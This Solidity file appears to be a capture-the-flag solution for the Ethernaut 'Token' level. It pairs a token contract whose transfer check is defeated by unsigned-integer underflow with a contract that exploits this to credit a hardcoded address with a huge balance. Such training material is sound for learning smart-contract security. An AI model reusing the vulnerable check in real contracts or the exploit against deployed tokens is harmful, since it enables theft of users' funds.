// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

contract ethernautToken {
    function solve() external {
        address contractAddr = 0x5dbaA950a7DB9C126dF5526Fa37116923b2FB8B5;
        Token token = Token(contractAddr);
        address me = 0x798349E06c67272465123B91bd88C5d19b8c7878;
        uint myBalance = token.balanceOf(me);
        uint totalSupply = token.totalSupply();
        uint amountToEarn = myBalance - totalSupply;
        token.transfer(me, amountToEarn);
    }
}
